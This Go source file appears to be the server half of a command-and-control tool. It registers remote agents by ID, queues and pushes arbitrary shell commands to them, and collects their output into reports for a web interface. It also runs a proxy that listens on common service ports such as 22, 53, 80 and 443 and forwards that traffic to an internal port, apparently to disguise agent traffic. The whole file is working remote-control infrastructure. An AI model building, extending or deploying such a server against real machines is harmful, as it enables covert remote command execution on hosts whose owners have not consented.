package cmd

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"sync"
	"time"
)

// Data structure for a Client
type Client struct {
	Name          string   `json:"name"`
	ID            string   `json:"id"`
	IP            string   `json:"ip"`
	OS            string   `json:"os"`
	SrcPort       string   `json:"srcport"`
	DstPort       string   `json:"dstport"`
	LastConnexion string   `json:"lastConnection"`
	TYPE          string   `json:"type"`
	ConnServer    net.Conn `json:"-"`
	ConnProxy     net.Conn `json:"-"`
	Icon          string   `json:"icon"`
	Reachable     bool     `json:"reachable"`
}

// Global variables shared among .go files
var (
	// Stored server logs
	LogInfo *log.Logger
	// Client map (key -> Id, Value -> Client), neeeded because can't store current conn in .json
	Clients = make(map[string]*Client)
	// Synchronisation variable to handle multi access
	ClientsMu = sync.Mutex{}
	// Port server -> data transfert client <-> server
	PortServer = "5437"
	// Retrieve Server IP address
	IPServer = GetLocalIP()
	// Incoming ports
	ProxyPorts = []string{"22", "53", "80", "443", "587", "993"}
)

// Main routine to handle each client's connection
func HandleConnection(conn net.Conn) {
	// Create a reader buffer
	idBuf := bufio.NewReader(conn)

	// Retrieve client Id
	id, err := idBuf.ReadString('\n')
	if err != nil {
		LogInfo.Printf("[!] Client: failed to retrieve id (%s): %v\n", conn.RemoteAddr(), err)
		return
	}
	id = strings.TrimSpace(id)

	// Check if the id has already been registered. If not, close the connection
	if !MyClientStore.IsInClientStore(id) {
		LogInfo.Printf("[!] Client - (id:%s): Access denied. ID not stored, failed to connect client (%s).\n", id, conn.RemoteAddr())
		PingWebSocket("", "")
		conn.Close()
		return
	}

	// Extract host and port from RemoteAddr() function
	host, port := extractHostAndPort(conn.RemoteAddr().String())

	// Retrieve previous data from the connected client in the ClientStore
	client, exists := MyClientStore.GetClient(id)
	if !exists {
		LogInfo.Printf("[!] Trying to get a client but does not exist.")
		return
	}

	// Check if an agent with the same ID is already connected
	if client.Reachable {
		LogInfo.Printf("[!] Client - (id:%s): Access denied. Same ID already connected, failed to connect client (%s).\n", id, conn.RemoteAddr())
		PingWebSocket("", "")
		conn.Close()
		return
	}

	// Update client values with new ones
	client.IP = host
	client.SrcPort = port
	// client.LastConnexion = time.Now().Format(time.RFC3339)
	client.LastConnexion = time.Now().Format("2006-01-02 15:04:05.000")
	client.ConnServer = conn
	client.Reachable = true

	// Save new value of the client in the ClientStore
	MyClientStore.SetClient(id, client)
	// Save new value of the client in the Clients tab
	ClientsMu.Lock()
	Clients[id] = &client
	ClientsMu.Unlock()

	// Ping front-end to update web UI
	LogInfo.Printf("[*] Client %s connected from %s", id, conn.RemoteAddr())
	PingWebSocket("connection_update", "")

	// Channel to send commands
	writeCh := make(chan string, 32)
	defer close(writeCh)

	// pending[cmdID] = Pending commands -> Queue
	pending := make(map[string]*struct {
		Cmd    string
		Output strings.Builder
	})
	// Synchronization variable to access pending
	var pendingMu sync.Mutex

	// Writer goroutine
	go func() {
		for cmd := range writeCh {
			for i := 0; i < 3; i++ {
				conn.SetWriteDeadline(time.Now().Add(20 * time.Minute))
				_, err := conn.Write([]byte(cmd + "\n"))
				if err == nil {
					LogInfo.Printf("[+] Sent command to %s: %s", id, cmd)
					break
				}
				LogInfo.Printf("[!] Retry %d failed for %s: %v", i+1, id, err)
				time.Sleep(500 * time.Millisecond)
			}
			if err != nil {
				LogInfo.Printf("[-] Final failure for %s: %v", id, err)
				markClientUnreachable(id)
				conn.Close()
				return
			}
		}
	}()

	// Reader goroutine avec découpage manuel
	go func() {
		buf := make([]byte, 4096)
		partial := ""
		for {
			n, err := conn.Read(buf)
			if err != nil {
				// If received error connection, then update reachability as false
				LogInfo.Printf("[!] Client %s disconnected: %v", id, err)
				markClientUnreachable(id)
				conn.Close()
				return
			}
			partial += string(buf[:n])
			for strings.Contains(partial, "\n") {
				var line string
				line, partial, _ = strings.Cut(partial, "\n")
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}

				switch {
				// OUT:cmdID:text
				case strings.HasPrefix(line, "OUT:"):
					parts := strings.SplitN(line, ":", 3)
					if len(parts) == 3 {
						cmdID, text := parts[1], parts[2]
						pendingMu.Lock()
						if p, ok := pending[cmdID]; ok {
							// Add output command line to p.Output variable
							p.Output.WriteString(text + "\n")
						}
						pendingMu.Unlock()
					}

				// END:cmdID
				case strings.HasPrefix(line, "END:"):
					parts := strings.SplitN(line, ":", 2)
					if len(parts) == 2 {
						cmdID := parts[1]
						pendingMu.Lock()
						if p, ok := pending[cmdID]; ok {
							SaveReport(id, p.Cmd, p.Output.String())
							// When command is done, remove it from pending and from CommandStore
							delete(pending, cmdID)
							MyCommandStore.DeleteCommand(id, p.Cmd)
							// Update front-end
							PingWebSocket("report_update", id)
						}
						pendingMu.Unlock()
					}

				// CMD:cmdID:command
				default:
					LogInfo.Printf("[<|] Raw from %s: %s", id, line)
				}
			}
		}
	}()

	// ----------------------------------------- > Execute commands stored when the client just connect
	stored := MyCommandStore.GetCommands(id)
	go func() {
		for _, cmd := range stored {
			cmdID := generateCmdID()
			pendingMu.Lock()
			pending[cmdID] = &struct {
				Cmd    string
				Output strings.Builder
			}{Cmd: cmd}
			pendingMu.Unlock()
			writeCh <- fmt.Sprintf("CMD:%s:%s", cmdID, cmd)

			// Wait until the command's excution end before moving to the next one
			for {
				time.Sleep(100 * time.Millisecond)
				pendingMu.Lock()
				_, stillPending := pending[cmdID]
				pendingMu.Unlock()
				if !stillPending {
					break
				}
			}
		}
	}()

	// ----------------------------------------- > Execute commands when the client is already connected
	// Listener real time
	cmdCh := make(chan string, 16)
	MyCommandStore.AddListener(id, cmdCh)
	defer MyCommandStore.RemoveListener(id, cmdCh)

	for cmd := range cmdCh {
		cmdID := generateCmdID()
		pendingMu.Lock()
		pending[cmdID] = &struct {
			Cmd    string
			Output strings.Builder
		}{Cmd: cmd}
		pendingMu.Unlock()
		writeCh <- fmt.Sprintf("CMD:%s:%s", cmdID, cmd)
	}
}

// Handle connection through proxy
func handleConnection(clientConn net.Conn) {
	// Handle proxy connection with client
	target := net.JoinHostPort(IPServer, PortServer)
	serverConn, err := net.Dial("tcp", target)
	if err != nil {
		log.Printf("Connection error towards server: %v", err)
		clientConn.Close()
		return
	}

	// Bidirectionnal transfert

	// Transfert client -> server
	go func() { // Incoming port to port server
		_, err := io.Copy(serverConn, clientConn)
		if err != nil {
			log.Printf("Client -> Server transfer error: %v", err)
		}
		serverConn.Close()
		clientConn.Close()
	}()

	// Transfert server -> client
	go func() { // Port server to incoming port
		_, err := io.Copy(clientConn, serverConn)
		if err != nil {
			log.Printf("Server -> Client transfer error: %v", err)
		}
		serverConn.Close()
		clientConn.Close()
	}()
}

// Create proxy to redirect port 22, 80, 443, ... to 5437
func StartProxy(port string) {
	target := fmt.Sprintf("%s:%s", IPServer, PortServer)
	listener, err := net.Listen("tcp", ":"+port)
	if err != nil {
		log.Fatalf("Error listening on port %s: %s", port, err)
	}
	LogInfo.Printf("Proxy enable on port %s -> %s", port, target)

	for {
		clientConn, err := listener.Accept()
		if err != nil {
			LogInfo.Printf("Error when accepting on port %s: %v", port, err)
			continue
		}

		go handleConnection(clientConn)
	}
}

// Generate a unique temporary Id to deal with all client connections
func generateCmdID() string {
	return fmt.Sprintf("%d", time.Now().UnixNano())
}

// Indicate when a client is not anymore connected to the server
func markClientUnreachable(id string) {
	ClientsMu.Lock()
	defer ClientsMu.Unlock()
	if client, ok := Clients[id]; ok {
		client.ConnServer.Close()
		client.Reachable = false
		MyClientStore.Connections[id] = *client
		_ = MyClientStore.Save()
	}
	PingWebSocket("connection_update_down", "")
}
